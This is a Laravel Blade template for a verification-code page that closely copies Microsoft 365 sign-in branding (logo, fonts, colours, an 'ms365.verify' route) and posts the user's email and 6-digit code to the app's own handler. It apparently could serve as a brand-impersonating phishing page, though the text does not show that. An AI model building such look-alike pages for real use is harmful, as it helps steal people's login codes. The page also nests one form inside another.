<x-guest-layout>
    <div class="otp-wrapper">
        <div class="otp-container">
            <div class="otp-header">
                <div class="ms-logo">
                    <svg width="40" height="40" viewBox="0 0 23 23" xmlns="http://www.w3.org/2000/svg">
                        <path d="M1 1h10v10H1z" fill="#f25022"/>
                        <path d="M12 1h10v10H12z" fill="#00a4ef"/>
                        <path d="M1 12h10v10H1z" fill="#ffb900"/>
                        <path d="M12 12h10v10H12z" fill="#7fba00"/>
                    </svg>
                </div>
                <h1>Enter verification code</h1>
                <p>We sent a code to <strong>{{ session('email') }}</strong></p>
            </div>

            <div class="otp-form">
                <x-auth-session-status class="mb-4" :status="session('status')" />

                <form method="POST" action="{{ route('otp.verify.store') }}">
                    @csrf
                    <input type="hidden" name="email" value="{{ session('email') }}">

                    <div class="form-group">
                        <label for="otp" class="otp-label">Verification code</label>
                        <div class="otp-input-container">
                            <input 
                                id="otp" 
                                type="text" 
                                name="otp" 
                                maxlength="6" 
                                placeholder="000000"
                                required 
                                autocomplete="off"
                                autofocus
                                class="otp-input @error('otp') error @enderror"
                                pattern="[0-9]{6}"
                                inputmode="numeric"
                            >
                            <div class="otp-hint">6-digit code</div>
                        </div>
                        @error('otp')
                            <div class="error-msg">
                                <i class="fas fa-exclamation-circle"></i>
                                {{ $message }}
                            </div>
                        @enderror
                    </div>

                    <div class="form-actions">
                        <button type="submit" class="btn-verify">
                            Verify
                        </button>
                    </div>

                    <div class="form-footer">
                        <div class="resend-section">
                            <p>Didn't receive the code?</p>
                            <form method="POST" action="{{ route('otp.resend') }}" class="resend-form">
                                @csrf
                                <input type="hidden" name="email" value="{{ session('email') }}">
                                <button type="submit" class="btn-resend">
                                    Send a new code
                                </button>
                            </form>
                        </div>
                        
                        <div class="back-link">
                            <a href="{{ route('ms365.verify') }}">
                                <i class="fas fa-arrow-left"></i>
                                Use a different email
                            </a>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <script>
        // Auto-format OTP input
        const otpInput = document.getElementById('otp');
        otpInput.addEventListener('input', function(e) {
            // Remove any non-numeric characters
            e.target.value = e.target.value.replace(/[^0-9]/g, '');
            
            // Auto-submit when 6 digits are entered
            if (e.target.value.length === 6) {
                setTimeout(() => {
                    e.target.form.submit();
                }, 500);
            }
        });

        // Auto-focus and select all on page load
        document.addEventListener('DOMContentLoaded', function() {
            otpInput.focus();
            otpInput.select();
        });
    </script>

    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f5f5;
            color: #323130;
        }

        .otp-wrapper {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .otp-container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 440px;
            animation: fadeIn 0.4s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .otp-header {
            text-align: center;
            padding: 40px 40px 20px 40px;
        }

        .ms-logo {
            margin-bottom: 20px;
            display: flex;
            justify-content: center;
        }

        .otp-header h1 {
            font-size: 24px;
            font-weight: 600;
            color: #323130;
            margin-bottom: 8px;
        }

        .otp-header p {
            font-size: 15px;
            color: #605e5c;
        }

        .otp-form {
            padding: 0 40px 40px 40px;
        }

        .form-group {
            margin-bottom: 24px;
        }

        .otp-label {
            display: block;
            font-size: 15px;
            font-weight: 600;
            color: #323130;
            margin-bottom: 8px;
        }

        .otp-input-container {
            position: relative;
        }

        .otp-input {
            width: 100%;
            padding: 16px 12px;
            font-size: 24px;
            font-weight: 600;
            text-align: center;
            letter-spacing: 8px;
            border: 2px solid #605e5c;
            border-radius: 2px;
            background: white;
            transition: all 0.2s ease;
            outline: none;
            font-family: 'Courier New', monospace;
        }

        .otp-input:focus {
            border-color: #0078d4;
            box-shadow: 0 0 0 1px #0078d4;
        }

        .otp-input.error {
            border-color: #d13438;
            box-shadow: 0 0 0 1px #d13438;
        }

        .otp-hint {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 12px;
            color: #605e5c;
            pointer-events: none;
        }

        .error-msg {
            margin-top: 8px;
            padding: 8px 12px;
            background: #fef0f0;
            border: 1px solid #d13438;
            border-radius: 2px;
            color: #d13438;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .btn-verify {
            width: 100%;
            padding: 12px;
            background: #0078d4;
            color: white;
            border: none;
            border-radius: 2px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s ease;
        }

        .btn-verify:hover {
            background: #106ebe;
        }

        .form-footer {
            margin-top: 32px;
        }

        .resend-section {
            text-align: center;
            padding: 16px;
            background: #f3f2f1;
            border-radius: 2px;
            margin-bottom: 16px;
        }

        .resend-section p {
            font-size: 14px;
            color: #605e5c;
            margin-bottom: 8px;
        }

        .resend-form {
            display: inline;
        }

        .btn-resend {
            background: none;
            border: none;
            color: #0078d4;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: underline;
            padding: 0;
        }

        .btn-resend:hover {
            color: #106ebe;
        }

        .back-link {
            text-align: center;
        }

        .back-link a {
            color: #0078d4;
            text-decoration: none;
            font-size: 14px;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }

        .back-link a:hover {
            text-decoration: underline;
        }

        .mb-4 div {
            padding: 16px;
            background: #dff6dd;
            border: 1px solid #107c10;
            border-radius: 2px;
            color: #107c10;
            font-size: 14px;
            margin-bottom: 24px;
        }

        @media (max-width: 520px) {
            .otp-container {
                max-width: 100%;
                border-radius: 0;
                box-shadow: none;
                min-height: 100vh;
            }

            .otp-header,
            .otp-form {
                padding-left: 24px;
                padding-right: 24px;
            }

            .otp-header {
                padding-top: 60px;
            }
        }
    </style>
</x-guest-layout>